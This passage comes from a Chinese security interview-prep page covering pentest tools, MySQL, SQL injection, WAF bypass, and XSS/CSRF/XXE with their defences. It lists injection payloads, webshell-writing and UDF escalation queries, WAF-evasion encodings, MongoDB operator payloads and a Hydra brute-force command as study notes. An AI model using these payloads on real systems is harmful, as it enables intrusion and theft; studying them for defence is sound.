rel="noopener">https://blog.csdn.net/ski_12/article/details/58188331</a><br>常用参数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-u 单个URL -m xx.txt 多个URL</span><br><span class="line">-d &quot;mysql:&#x2F;&#x2F;user:password@10.10.10.137:3306&#x2F;dvwa&quot;  作为服务器客户端，直接连接数据库</span><br><span class="line">--data post&#x2F;get都适用</span><br><span class="line">-p 指定扫描的参数</span><br><span class="line">-r 读取文件</span><br><span class="line">-f 指纹信息</span><br><span class="line">--tamper 混淆脚本，用于应用层过滤</span><br><span class="line">--cookie --user-agent --host等等http头的修改</span><br><span class="line">--threads 并发线程 默认为1</span><br><span class="line">--dbms MySQL&lt;5.0&gt; 指定数据库或版本</span><br><span class="line">–level&#x3D;LEVEL 执行测试的等级（1-5，默认为 1）</span><br><span class="line">–risk&#x3D;RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险</span><br><span class="line">–current-db &#x2F; 获取当前数据库名称</span><br><span class="line">–dbs 枚举数据库管理系统数据库</span><br><span class="line">–tables 枚举 DBMS 数据库中的表</span><br><span class="line">–columns 枚举 DBMS 数据库表列</span><br><span class="line">-D DB 要进行枚举的数据库名</span><br><span class="line">-T TBL 要进行枚举的数据库表</span><br><span class="line">-C COL 要进行枚举的数据库列</span><br><span class="line">-U USER 用来进行枚举的数据库用户</span><br></pre></td></tr></table></figure>常用的tamper<blockquote><p>本地：sqlmap-tamper分类.xlsx</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">base64encode.py #转为b64编码</span><br><span class="line">charencode.py url编码</span><br><span class="line">chardoubleencode.py 双URL编码</span><br><span class="line">unmagicquotes.py 宽字节</span><br><span class="line">randomcomments.py 用&#x2F;**&#x2F;分割SQL关键字</span><br><span class="line">space2plus.py space2comment.py space2xxxx.py 替换空格为xx</span><br></pre></td></tr></table></figure><h4 id="-32"><a href="#-32" class="headerlink" title=""></a></h4><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nmap hostname&#x2F;ip或者多个ip或者子网192.168.123.*</span><br><span class="line">-iL ip.txt 扫描ip.txt的所有ip</span><br><span class="line">-A 包含了-sV，-O，探测操作系统信息和路由跟踪。一般不用，是激烈扫描</span><br><span class="line">-O 探测操作系统信息</span><br><span class="line">-sV 查找主机服务版本号</span><br><span class="line">-sA 探测该主机是否使用了包过滤器或防火墙</span><br><span class="line">-sS 半开扫描，一般不会记入日志，不过需要root权限。</span><br><span class="line">-sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。</span><br><span class="line">-sP ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。</span><br><span class="line">-sN TCP空扫描</span><br><span class="line">-F 快速扫描</span><br><span class="line">-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。</span><br><span class="line">-p 指定端口&#x2F;端口范围</span><br><span class="line">-oN 将报告写入文件</span><br><span class="line">-v 详细信息</span><br><span class="line">-T&lt;0-5&gt; 设定速度</span><br></pre></td></tr></table></figure>Nmap还可以用到爆破等一些脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--script all 使用所有脚本</span><br><span class="line">--script&#x3D;sql.injection.nse sql注入</span><br><span class="line">--script&#x3D;&quot;smb*&quot;  扫smb系列</span><br></pre></td></tr></table></figure><h4 id="-33"><a href="#-33" class="headerlink" title=""></a></h4><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4>使用内置模块。HR：常用的模块有哪些？ tcp反向链接 msfvenom<h4 id="-34"><a href="#-34" class="headerlink" title=""></a></h4><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4>密码爆破工具，FTP，MSSQL，MYSQL，POP3，SSH，rdp，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra IP -l loginname -P pass.txt PROTROCL</span><br><span class="line">hydra 127.0.0.1 -l root -P pass.txt ssh</span><br></pre></td></tr></table></figure><h4 id="-35"><a href="#-35" class="headerlink" title=""></a></h4><h4 id="kali信息收集工具"><a href="#kali信息收集工具" class="headerlink" title="kali信息收集工具"></a>kali信息收集工具</h4></li></ol><ul><li>dig</li><li>whois</li><li>host:查询dns服务器</li><li>nslookup</li><li>域名枚举：fierse -dns</li><li>maltego</li><li>onesixtyone<h4 id="-36"><a href="#-36" class="headerlink" title=""></a></h4><h4 id="流量分析WireShark"><a href="#流量分析WireShark" class="headerlink" title="流量分析WireShark"></a>流量分析WireShark</h4>CTF<h3 id="-37"><a href="#-37" class="headerlink" title=""></a></h3><h3 id="描述一个你深入研究过的CVE或POC-ms17-010-最新的CVE"><a href="#描述一个你深入研究过的CVE或POC-ms17-010-最新的CVE" class="headerlink" title="描述一个你深入研究过的CVE或POC(ms17-010/最新的CVE)"></a>描述一个你深入研究过的CVE或POC(ms17-010/最新的CVE)</h3><h2 id="-38"><a href="#-38" class="headerlink" title=""></a></h2><h2 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h2><blockquote><p><a href="https://www.zhihu.com/question/22953267" target="_blank" rel="noopener">https://www.zhihu.com/question/22953267</a></p></blockquote><h3 id="-39"><a href="#-39" class="headerlink" title=""></a></h3><h3 id="MySQL面试题"><a href="#MySQL面试题" class="headerlink" title="MySQL面试题"></a>MySQL面试题</h3><h4 id="-40"><a href="#-40" class="headerlink" title=""></a></h4><h4 id="MySQL存储引擎？"><a href="#MySQL存储引擎？" class="headerlink" title="MySQL存储引擎？"></a>MySQL存储引擎？</h4></li></ul><ol><li>InnoDB：主流的存储引擎。支持事务、支持行锁、支持非锁定读、支持外键约束</li></ol><ul><li>为MySQL提供了具有提交、回滚和崩溃恢复能力的事物安全（ACID兼容）存储引擎。InnoDB锁定在行级并且也在  SELECT语句中提供一个类似Oracle的非锁定读。这些功能增加了多用户部署和性能。在SQL查询中，可以自由地将InnoDB类型的表和其他MySQL的表类型混合起来，甚至在同一个查询中也可以混合</li><li>InnoDB存储引擎为在主内存中缓存数据和索引而维持它自己的缓冲池。InnoDB将它的表和索引在一个逻辑表空间中，表空间可以包含数个文件（或原始磁盘文件）。这与MyISAM表不同，比如在MyISAM表中每个表被存放在分离的文件中。InnoDB表可以是任何尺寸，即使在文 件尺寸被限制为2GB的操作系统上</li><li>InnoDB支持外键完整性约束，存储表中的数据时，每张表的存储都按主键顺序存放，如果没有显示在表定义时指定主键，InnoDB会为每一行生成一个6字节的ROWID，并以此作为主键</li></ul><ol><li>MyISAM：访问速度快，不支持事务，逐渐被淘汰</li><li>MEMORY：BTREE索引或者HASH索引。将表中数据放在内存中，并发性能差。<code>information_schema</code>用的是该引擎</li><li>MERGE、Archive等等不常用的<h4 id="-41"><a href="#-41" class="headerlink" title=""></a></h4><h4 id="什么是事务？"><a href="#什么是事务？" class="headerlink" title="什么是事务？"></a>什么是事务？</h4>事务是一组原子性的SQL语句或者说是一个独立的工作单元，如果数据库引擎能够成功对数据库应用这组SQL语句，那么就执行，如果其中有任何一条语句因为崩溃或其它原因无法执行，那么所有的语句都不会执行。也就是说，事务内的语句，要么全部执行成功，要么全部执行失败。 举个银行应用的典型例子：<br>假设银行的数据库有两张表：支票表和储蓄表，现在某个客户A要从其支票账户转移2000元到其储蓄账户，那么至少需求三个步骤：<br>a.检查A的支票账户余额高于2000元；<br>b.从A的支票账户余额中减去2000元；<br>c.在A的储蓄账户余额中增加2000元。<br>这三个步骤必须要打包在一个事务中，任何一个步骤失败，则必须要回滚所有的步骤，否则A作为银行的客户就可能要莫名损失2000元，就出问题了。这就是一个典型的事务，这个事务是不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，不可能只执行其中一部分，这也是事务的原子性特征。<h4 id="-42"><a href="#-42" class="headerlink" title=""></a></h4><h4 id="读锁和写锁"><a href="#读锁和写锁" class="headerlink" title="读锁和写锁"></a>读锁和写锁</h4>读锁是共享的，即相互不阻塞的，多个客户在同一时刻可以读取同一资源，互不干扰。写锁是排他的，即一个写锁会阻塞其它的写锁和读锁，只有这样，才能确保给定时间内，只有一个用户能执行写入，防止其它用户读取正在写入的同一资源。写锁优先级高于读锁。<h4 id="-43"><a href="#-43" class="headerlink" title=""></a></h4><h4 id="MySQL的索引"><a href="#MySQL的索引" class="headerlink" title="MySQL的索引"></a>MySQL的索引</h4>索引是帮助MySQL高效获取数据的数据结构。MYISAM和InnoDB存储引擎只支持BTree索引；MEMORY和HEAP储存引擎可以支持HASH和BTREE索引。<h4 id="-44"><a href="#-44" class="headerlink" title=""></a></h4><h4 id="ORDER-BY在注入的运用"><a href="#ORDER-BY在注入的运用" class="headerlink" title="ORDER BY在注入的运用"></a>ORDER BY在注入的运用</h4><h4 id="-45"><a href="#-45" class="headerlink" title=""></a></h4><h4 id="GPC是什么？GPC之后怎么绕过？"><a href="#GPC是什么？GPC之后怎么绕过？" class="headerlink" title="GPC是什么？GPC之后怎么绕过？"></a>GPC是什么？GPC之后怎么绕过？</h4>如果<code>magic_quotes_gpc=On</code>，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染。<h4 id="-46"><a href="#-46" class="headerlink" title=""></a></h4><h4 id="Mysql一个-和两个-什么区别"><a href="#Mysql一个-和两个-什么区别" class="headerlink" title="Mysql一个@和两个@什么区别"></a>Mysql一个@和两个@什么区别</h4></li></ol><ul><li>@为用户变量，使用<code>SET @var1=1</code>赋值</li><li>@@ 为系统变量 ，包括全局变量<code>show global variables \G;</code>和会话变量<code>show session variables \G;</code><h4 id="-47"><a href="#-47" class="headerlink" title=""></a></h4><h4 id="注入-绕过常用的函数"><a href="#注入-绕过常用的函数" class="headerlink" title="注入/绕过常用的函数"></a>注入/绕过常用的函数</h4></li></ul><ol><li>基于布尔SQL盲注<ul><li><code>left(database(),1)&gt;&#39;s&#39;</code></li><li><code>ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+</code></li><li><code>ascii(substr((select database()),1,1))=98</code></li><li><code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</code></li><li><code>regexp</code>正则注入 <code>select user() regexp &#39;^[a-z]&#39;;</code></li><li><code>select user() like &#39;ro%&#39;</code></li></ul></li><li>基于报错的SQL盲注<ul><li><code>Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</code><h4 id="-48"><a href="#-48" class="headerlink" title=""></a></h4><h4 id="MySQL存储过程"><a href="#MySQL存储过程" class="headerlink" title="MySQL存储过程"></a>MySQL存储过程</h4><h4 id="-49"><a href="#-49" class="headerlink" title=""></a></h4><h4 id="各种写shell的问题"><a href="#各种写shell的问题" class="headerlink" title="各种写shell的问题"></a>各种写shell的问题</h4></li></ul></li><li>写shell用什么函数？<ul><li><code>select &#39; into outfile &#39;D:/shelltest.php&#39;</code></li><li><code>dumpfile</code></li><li><code>file_put_contents</code></li></ul></li><li>outfile不能用了怎么办？ <code>select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&#39;;</code>可以UDF提权 <a href="https://www.cnblogs.com/milantgh/p/5444398.html" target="_blank" rel="noopener">https://www.cnblogs.com/milantgh/p/5444398.html</a></li><li>dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</li><li>sleep()能不能写shell？</li><li>写shell的条件？<ul><li>用户权限</li><li>目录读写权限</li><li>防止命令执行：<code>disable_functions</code>，禁止了<code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，但是可以用dl扩展执行命令或者ImageMagick漏洞 <a href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html" target="_blank" rel="noopener">https://www.waitalone.cn/imagemagic-bypass-disable_function.html</a></li><li>open_basedir: 将用户可操作的文件限制在某目录下<h4 id="-50"><a href="#-50" class="headerlink" title=""></a></h4><h3 id="-51"><a href="#-51" class="headerlink" title=""></a></h3><h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3></li></ul></li><li>基于报错注入</li><li>基于布尔的注入，根据返回页面判断条件真假的注入</li><li>基于时间的盲注，不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li><li>宽字节注入</li><li>联合查询，可以使用 union 的情况下的注入。</li><li>堆查询注入，可以同时执行多条语句的执行时的注入。<h3 id="-52"><a href="#-52" class="headerlink" title=""></a></h3><h3 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h3>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。通常未经检查或者未经充分检查的用户输入数据或代码编写问题，意外变成了代码被执行。<h3 id="-53"><a href="#-53" class="headerlink" title=""></a></h3><h3 id="过waf"><a href="#过waf" class="headerlink" title="过waf"></a>过waf</h3><blockquote><p><a href="https://blog.csdn.net/wjy397/article/details/53263281" target="_blank" rel="noopener">https://blog.csdn.net/wjy397/article/details/53263281</a></p></blockquote></li><li>确定waf类型，狗、盾、神、锁、宝、卫士</li><li>使用注释符号或者特殊符号或者多个特殊符号重复<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># </span><br><span class="line">--</span><br><span class="line">-- - &#x2F;&#x2F;5.6.12特性，需要加空格</span><br><span class="line">--+</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;**&#x2F; &#x2F;&#x2F;c风格注释</span><br><span class="line">&#x2F;**&#x2F;&#x2F;**&#x2F;  &#x2F;&#x2F;多个注释</span><br><span class="line">&#x2F;*letmetest*&#x2F;</span><br><span class="line">;</span><br><span class="line"># 科学记数法</span><br><span class="line">id&#x3D;0e1union select</span><br><span class="line"># 空白字符</span><br><span class="line">SQLite3 0A 0D 0C 09 20 </span><br><span class="line">MySQL5 09 0A 0B 0C 0D A0 20 </span><br><span class="line">PosgresSQL 0A 0D 0C 09 20 </span><br><span class="line">Oracle 11g 00 0A 0D 0C 09 20 </span><br><span class="line">MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br></pre></td></tr></table></figure></li><li>使用sql内置函数或者关键字<blockquote><p>报错注入 <a href="https://blog.csdn.net/like98k/article/details/79646512" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/79646512</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 常用</span><br><span class="line">extractvalue</span><br><span class="line">updatexml 报错注入</span><br><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">or updatexml(1, concat(0x7e, (version()), 0x7e), 0);</span><br><span class="line">&gt; select * from  users where id &#x3D; 1 and updatexml(1, concat(0x7e, (version()), 0x7e), 0);</span><br><span class="line">&gt; version() database() (SELECT concat(column_name) FROM information_schema.columns WHERE table_name&#x3D;&#39;users&#39; limit 0,1</span><br><span class="line">floor()</span><br><span class="line">ceil()</span><br><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">concat(version(),&#39;|&#39;,user());</span><br><span class="line">concat_ws(&#39;|&#39;,1,2,3)</span><br><span class="line">Char(49)</span><br><span class="line">Hex(&#39;a&#39;)</span><br><span class="line">Unhex(61)</span><br><span class="line">过滤了逗号</span><br><span class="line">(1)limit处的逗号：</span><br><span class="line">limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号</span><br><span class="line">mid处的逗号：</span><br><span class="line">mid(version() from 1 for 1)</span><br></pre></td></tr></table></figure></li><li>利用容器特性，比如iis+asp的环境可能会吞掉%(f%rom-&gt;from)造成注入，或者iis支持unicode解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但waf可能不会拦截造成注入</li><li>畸形协议/请求。asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交方式;php+apache解析协议除了get/post外随便定义协议也可能过</li><li>%0a换行</li><li>多次URL编码，waf的一根筋过滤<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unlencode</span><br><span class="line">base64</span><br><span class="line">json</span><br><span class="line">binary</span><br><span class="line">querystring</span><br><span class="line">htmlencode</span><br><span class="line">unicode</span><br><span class="line">php serialize</span><br></pre></td></tr></table></figure></li><li>http参数污染，<code>id=1&amp;id=2&amp;id=3</code> <code>id=1,2,3</code><h3 id="-54"><a href="#-54" class="headerlink" title=""></a></h3><h3 id="如何进行SQL注入的防御"><a href="#如何进行SQL注入的防御" class="headerlink" title="如何进行SQL注入的防御"></a>如何进行SQL注入的防御</h3></li><li>关闭应用的错误提示</li><li>加waf</li><li>对输入进行过滤</li><li>限制输入长度</li><li>限制好数据库权限，drop/create/truncate等权限谨慎grant</li><li>预编译好sql语句，python和Php中一般使用?作为占位符。这种方法是从编程框架方面解决利用占位符参数的sql注入，只能说一定程度上防止注入。还有缓存溢出、终止字符等。</li><li>数据库信息加密安全（引导到密码学方面）。不采用md5因为有彩虹表，一般是一次md5后加盐再md5</li><li>清晰的编程规范，结对/自动化代码 review ，加大量现成的解决方案（PreparedStatement，ActiveRecord，歧义字符过滤， 只可访问存储过程 balabala）已经让 SQL 注入的风险变得非常低了。</li><li>具体的语言如何进行防注入，采用什么安全框架<blockquote><p>作者：没啥意思 链接：<a href="https://www.zhihu.com/question/22953267/answer/23222069" target="_blank" rel="noopener">https://www.zhihu.com/question/22953267/answer/23222069</a> 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。<br>SQL注入问题既不能“靠用户（开发者也是用户）的自觉去避免”，也不能完全脱离用户（开发者也是用户）而指望数据库层面去避免。对于那些不了解SQL注入漏洞细节或不关心SQL注入漏洞或没精力去关心SQL注入漏洞的工程师，你要给他们一条尽可能简单可行透明的方案来避免SQL注入漏洞，告诉他这样写就可以了，这就是安全框架；然后告诉他或者让他的老大告诉他你必须这样写，这就是安全编码规范；然后你有手段在他没有这样写的时候能够检查出来（这比检查出漏洞要容易）并推动他改正，这就是白盒检查。<br>我们现在的互联网产品SQL注入漏洞仍然层出不穷，并不是这套思路有问题，相反恰恰是这套思路没有完善。一方面是框架方案本身不完善，以SQL注入漏洞为例，参数化是防SQL注入框架级方案的重要部分，但仅靠参数化没法很好满足开发过程中一些常见需求，如逗号分割的id列表问题、排序标记的问题等等（其实这些问题真要用参数化的方案解决也可以），使得开发更愿意在这些地方使用非参数化或伪参数化的方法（比如拼接SQL片段后再把整个片段当作参数扔进去exec）。这些问题在参数化的基础上，再加以改进，仍然守着拼接SQL片段时进行强类型转换的思路，仍然是能很好解决的，也就是继续完善参数化方案的问题，而不是看上去那样“参数化解决不了问题”。另一方面，安全编码规范的制定、培训、流程建设和实施保证上也做得远远不到位，开发leader们更希望后面的数据库或者前面的安全防御上能有手段去解决SQL注入问题，对于安全工程师来说，设置并维护几个特征串、语法分析场景也远比做那些安全框架、编码规范、白盒扫描来得要轻松实在，彼此在心照不宣中度过今天，自然不能指望明天能彻底踏实。</p></blockquote><h3 id="-55"><a href="#-55" class="headerlink" title=""></a></h3><h3 id="mysql的网站注入，5-0以上和5-0以下有什么区别？"><a href="#mysql的网站注入，5-0以上和5-0以下有什么区别？" class="headerlink" title="mysql的网站注入，5.0以上和5.0以下有什么区别？"></a>mysql的网站注入，5.0以上和5.0以下有什么区别？</h3>10年前就出了5.0，现在都到5.7了，没啥意义的问题</li></ol><ul><li>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</li><li>5.0以下是多用户单操作，5.0以上是多用户多操做。<h3 id="-56"><a href="#-56" class="headerlink" title=""></a></h3><h3 id="SQL和NoSQL的区别"><a href="#SQL和NoSQL的区别" class="headerlink" title="SQL和NoSQL的区别"></a>SQL和NoSQL的区别</h3>SQL关系型数据库，NoSQL(Not only SQL)非关系型数据库<h4 id="-57"><a href="#-57" class="headerlink" title=""></a></h4><h4 id="SQL优点"><a href="#SQL优点" class="headerlink" title="SQL优点"></a>SQL优点</h4>关系型数据库是指用关系数学模型来表示的数据，其中是以二维表的形式描述数据。</li></ul><ol><li>结构稳定，不易修改，常用联表查询</li><li>查询能力高，可以操作很复杂的查询</li><li>一致性高，处理数据会使用封锁保证数据不被改变</li><li>表具有逻辑性，易于理解<h4 id="-58"><a href="#-58" class="headerlink" title=""></a></h4><h4 id="SQL缺点"><a href="#SQL缺点" class="headerlink" title="SQL缺点"></a>SQL缺点</h4></li><li>不适用高并发读写</li><li>不适用海量数据高效读写</li><li>层次多，扩展性低</li><li>维护一致性开销大</li><li>涉及联表查询，复杂，慢<h4 id="-59"><a href="#-59" class="headerlink" title=""></a></h4><h4 id="NoSQL优点"><a href="#NoSQL优点" class="headerlink" title="NoSQL优点"></a>NoSQL优点</h4>采用键值对存储数据</li><li>由于数据之间没有关系，所以易扩展，也易于查询</li><li>数据结构灵活，每个数据都可以有不同的结构</li><li>由于降低了一致性的要求，所以查询速度更快<h4 id="-60"><a href="#-60" class="headerlink" title=""></a></h4><h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4>非关系型数据库的产生是因为随着网站的进化，并发性增加，扩展性高，一致性要求降低。这样关系型数据库最重要的一致性维护就显得有点多余，并且消耗着性能。因此有了非关系型数据库，它可以算是关系型数据库的一种弱化的结果，在海量数据存储和查询上更胜一筹。<br>两种数据库没有好坏之分，只是使用的环境不一样。关系型数据库可以说是更严谨的，可靠性更强的数据库，在对于数据精度要求高的环境，比如说银行系统这样自然是像mysql这样的数据库适合。非关系型数据库胜在处理大数据的速度，但是对于数据的准确度没有那么高，对于操作量大的环境比如当前大部分web2.0的网站更加适用一些。<h4 id="-61"><a href="#-61" class="headerlink" title=""></a></h4><h4 id="MongoDB注入方式"><a href="#MongoDB注入方式" class="headerlink" title="MongoDB注入方式"></a>MongoDB注入方式</h4>利用正则：找到y开头的name   <code>db.items.find({name: {$regex: &quot;^y&quot;}})</code><br>一些payload</li><li><code>?login[$regex]=^&amp;password[$regex]=^</code></li><li><code>?login[$not][$type]=1&amp;password[$not][$type]=1</code><h2 id="-62"><a href="#-62" class="headerlink" title=""></a></h2><h2 id="XSS-CSRF-XXE"><a href="#XSS-CSRF-XXE" class="headerlink" title="XSS CSRF XXE"></a>XSS CSRF XXE</h2><h3 id="-63"><a href="#-63" class="headerlink" title=""></a></h3><h3 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h3><blockquote><p>xss学习 <a href="https://www.secpulse.com/?s=+那些年我们一起学XSS+" target="_blank" rel="noopener">https://www.secpulse.com/?s=+%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS+</a><br>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。<br>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.<br>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p></blockquote><h3 id="-64"><a href="#-64" class="headerlink" title=""></a></h3><h3 id="CSRF、SSRF和重放攻击有什么区别？"><a href="#CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF和重放攻击有什么区别？"></a>CSRF、SSRF和重放攻击有什么区别？</h3></li></ol><ul><li>CSRF是跨站请求伪造攻击，由客户端发起</li><li>SSRF是服务器端请求伪造，由服务器发起</li><li>重放攻击是将截获的数据包进行重放，达到身份认证等目的<h3 id="-65"><a href="#-65" class="headerlink" title=""></a></h3><h3 id="啥是同源策略，跨域有几种方式？"><a href="#啥是同源策略，跨域有几种方式？" class="headerlink" title="啥是同源策略，跨域有几种方式？"></a>啥是同源策略，跨域有几种方式？</h3><blockquote><p><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a><br>浏览器安全的基石是”同源政策”，目的是为了保证用户的信息安全，防止恶意网站窃取数据，避免cookie共享。同源含义是协议、域名、端口相同的两个网页才可以共用cookie。目前如果非同源，有三种行为收到限制： - Cookie、LocalStorage 和 IndexDB 无法读取。 - DOM 无法获得。 - AJAX 请求不能发送</p></blockquote><h3 id="-66"><a href="#-66" class="headerlink" title=""></a></h3><h3 id="如何规避同源策略？"><a href="#如何规避同源策略？" class="headerlink" title="如何规避同源策略？"></a>如何规避同源策略？</h3><h4 id="-67"><a href="#-67" class="headerlink" title=""></a></h4><h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4>向服务器请求json数据回调，一般请求URL会加上<code>&amp;callback=xx</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foo(&#123;</span><br><span class="line">  &quot;ip&quot;: &quot;8.8.8.8&quot;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>由于``元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。<h5 id="-68"><a href="#-68" class="headerlink" title=""></a></h5><h5 id="JSONP的劫持"><a href="#JSONP的劫持" class="headerlink" title="JSONP的劫持"></a>JSONP的劫持</h5><blockquote><p><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/03/jsonp_security_technic/</a><br>防御：</p></blockquote></li></ul><ol><li>验证 JSON 文件调用的来源（ Referer ），但是Referer 过滤（正则）不严谨、空 Referer也不行</li><li>随机token</li><li><h4 id="-69"><a href="#-69" class="headerlink" title=""></a></h4><h4 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h4>WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。<h4 id="-70"><a href="#-70" class="headerlink" title=""></a></h4><h4 id="CORS-重点"><a href="#CORS-重点" class="headerlink" title="CORS(重点)"></a>CORS(重点)</h4><blockquote><p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/cors.html</a><br>CORS是跨源资源分享（Cross-Origin Resource 